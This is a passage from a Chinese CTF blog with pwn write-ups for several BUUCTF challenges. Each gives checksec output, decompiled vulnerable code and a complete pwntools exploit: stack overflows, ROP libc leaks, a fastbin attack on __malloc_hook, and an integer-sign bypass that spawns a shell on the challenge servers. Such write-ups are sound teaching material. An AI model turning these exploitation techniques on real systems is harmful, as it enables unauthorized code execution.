shell"><table><tr><td class="code"><pre><span class="line">➜  others_shellcode checksec shell_asm</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/others_shellcode/shell_asm&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>main函数直接<code>getshell</code>了，这题应该是为了展示shellcode吧</p><h3 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h3><p>存在NX, 没有PIE, Canary</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  ciscn_2019_ne_5 checksec ciscn_2019_ne_5</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/ciscn_2019_ne_5/ciscn_2019_ne_5&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p><strong>Print函数</strong>中存在<code>system</code></p><p>搜索发现存在<code>sh</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="buuctf.assets/image-20211030194852369.png" alt="image-20211030194852369"></p><p><strong>AddLog函数</strong>中可以输入log</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">AddLog</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new log info:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Getflag函数</strong>中存在<code>strcpy</code>, 而这里复制的正是<strong>AddLog函数</strong>中输入的数据</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">GetFlag</span><span class="params">(<span class="keyword">char</span> *src)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v3最大为60字节, 而上个函数可以输入128个字节，则可以溢出</p><h4 id="EXP-13"><a href="#EXP-13" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ciscn_2019_ne_5&quot;</span>)</span><br><span class="line"><span class="comment"># p = Remote()</span></span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./ciscn_2019_ne_5&quot;</span>)</span><br><span class="line">sh_addr = <span class="number">0x080482ea</span></span><br><span class="line">system_addr = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;administrator&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;1&quot;</span> * <span class="number">0x48</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">4</span> + p32(system_addr) + <span class="string">b&quot;A&quot;</span> * <span class="number">4</span> + p32(sh_addr)</span><br><span class="line">sla(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;Please input new log info:&quot;</span>, payload)</span><br><span class="line">sla(<span class="string">&quot;:&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  铁人三项(第五赛区)_2018_rop checksec 2018_rop</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/铁人三项(第五赛区)_2018_rop/2018_rop&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>**vulnerable_function()**存在溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+10h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而没有<code>sysytem</code>和<code>binsh</code>所以需要溢出找到<code>libc</code>, 从而<code>getshell</code></p><h4 id="EXP-14"><a href="#EXP-14" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./2018_rop&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:25187&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./2018_rop&quot;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x88</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">4</span> + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">read_addr = u32(p.recv())</span><br><span class="line">lib = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line">libc_base = read_addr - lib.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + lib.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">str_bin_sh = libc_base + lib.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0x88</span> + <span class="string">b&quot;b&quot;</span> * <span class="number">4</span> + p32(system_addr) + p32(main_addr) + p32(str_bin_sh)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h3><p>64位, NX 但没有PIE, Canary,</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  bjdctf_2020_babyrop checksec bjdctf_2020_babyrop</span><br><span class="line">[*] &#x27;/mnt/c/Users/Lantern/Documents/Lantern/CTF/Games/BUUCTF/Pwn/bjdctf_2020_babyrop/bjdctf_2020_babyrop&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><strong>vuln函数</strong>存在栈溢出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x64</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出泄露libc基址从而getshell</p><h4 id="EXP-15"><a href="#EXP-15" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="comment"># context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bjdctf_2020_babyrop&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:29960&quot;</span>)</span><br><span class="line">rv = p.recv</span><br><span class="line">ru = p.recvuntil</span><br><span class="line">rl = p.recvline</span><br><span class="line">sd = p.send</span><br><span class="line">sa = p.sendafter</span><br><span class="line">sl = p.sendline</span><br><span class="line">sla = p.sendlineafter</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./bjdctf_2020_babyrop&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;puts_got =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_got)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x0000000000400733</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">32</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> </span><br><span class="line">payload += p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">sla(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>, payload)</span><br><span class="line">ru(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">puts_addr = u64(rv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;puts_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">lib = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">lib_base = puts_addr - lib.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = lib_base + lib.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin_sh = lib_base + lib.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;system_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;str_bin_sh =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(str_bin_sh)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">32</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + p64(pop_rdi_addr) + p64(str_bin_sh) + p64(system_addr)</span><br><span class="line">sla(<span class="string">&quot;Pull up your sword and tell me u story!&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>main函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Node *Nodes; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  Nodes = (Node *)Init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Menu();</span><br><span class="line">    <span class="keyword">switch</span> ( read_int() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        Allocate(Nodes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        Fill(Nodes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        Free(Nodes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        Dump(Nodes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>其中<strong>Fill函数</strong>存在问题，size可以自己设定</li><li>需要注意的是<strong>Allocate函数</strong>使用<code>calloc</code>函数, 分配内存后会把数据区域全部置零</li></ul><p>攻击思路: 伪造堆块送入<code>unsorted bin</code>, 其首个<code>free</code>掉的chunk会指向<code>main_arena + 0x58</code>的固定地址，而从而泄露<code>main_arena</code>, 从而泄露libc基址</p><h4 id="EXP-16"><a href="#EXP-16" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = &quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./babyheap_0ctf_2017&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:25195&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Allocate</span>(<span class="params">size</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Fill</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    ru(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    ru(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Dump</span>(<span class="params">idx</span>):</span></span><br><span class="line">    ru(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    ru(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x000000000000113D)&quot;)</span></span><br><span class="line"></span><br><span class="line">Allocate(<span class="number">0x60</span>)  <span class="comment"># 0</span></span><br><span class="line">Allocate(<span class="number">0x40</span>)  <span class="comment"># 1</span></span><br><span class="line">Allocate(<span class="number">0x100</span>) <span class="comment"># 2</span></span><br><span class="line">Fill(<span class="number">0</span>, <span class="number">0x60</span> * <span class="string">b&quot;A&quot;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) <span class="comment"># chunk1.size &lt;&lt;= 0x71</span></span><br><span class="line">Fill(<span class="number">2</span>, <span class="number">0x10</span> * <span class="string">b&quot;B&quot;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) <span class="comment"># pass check</span></span><br><span class="line"></span><br><span class="line">Free(<span class="number">1</span>) <span class="comment"># free chunk1 to fastbin</span></span><br><span class="line">Allocate(<span class="number">0x60</span>) <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">Fill(<span class="number">1</span>, <span class="number">0x40</span> * <span class="string">b&quot;C&quot;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line">Allocate(<span class="number">0x100</span>)</span><br><span class="line">Free(<span class="number">2</span>)</span><br><span class="line">Dump(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">88</span></span><br><span class="line">log.success(<span class="string">f&quot;main_arena =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(main_arena)&#125;</span>&quot;</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">offset = <span class="number">0x3c4b20</span></span><br><span class="line">lib.address = main_arena - offset</span><br><span class="line">log.success(<span class="string">f&quot;lib_address =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(lib.address)&#125;</span>&quot;</span>)</span><br><span class="line">malloc_hook_addr = lib.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;malloc_hook_addr =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(malloc_hook_addr)&#125;</span>&quot;</span>)</span><br><span class="line">fake_chunk = malloc_hook_addr - <span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">Free(<span class="number">1</span>)</span><br><span class="line">Fill(<span class="number">0</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(fake_chunk) + p64(<span class="number">0</span>))</span><br><span class="line">Allocate(<span class="number">0x60</span>)</span><br><span class="line">Allocate(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">Fill(<span class="number">2</span>, <span class="string">b&quot;A&quot;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(lib.address + one_gadgets[<span class="number">1</span>]))</span><br><span class="line">Allocate(<span class="number">0x100</span>)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>主函数</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105163410067.png" alt="image-20211105163410067"></p><ul><li><code>nbytes</code>为size_t类型，但与10对比时类型转换为了int，那么我们可以输入负数使得可以过检测，且下方read溢出</li></ul><p>溢出到后面函数即可</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105163634607.png" alt="image-20211105163634607"></p><h4 id="EXP-17"><a href="#EXP-17" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;DEBUG&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Remote</span>(<span class="params">address</span>):</span></span><br><span class="line">    ip_port = address.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    ip = ip_port[<span class="number">0</span>]</span><br><span class="line">    port = ip_port[<span class="number">1</span>]</span><br><span class="line">    p = remote(ip, port)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Debug</span>(<span class="params">p, breakpoints</span>):</span></span><br><span class="line">    gdb.attach(p, breakpoints)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bjdctf_2020_babystack2&quot;</span>)</span><br><span class="line">p = Remote(<span class="string">&quot;node4.buuoj.cn:29567&quot;</span>)</span><br><span class="line">rv =<span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x: p.sendafter(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x: p.sendlineafter(x)</span><br><span class="line">ia = p.interactive</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">backdoor = <span class="number">0x0000000000400726</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">16</span> + <span class="string">b&quot;B&quot;</span> * <span class="number">8</span> + p64(backdoor)</span><br><span class="line">ru(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>)</span><br><span class="line">sd(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" 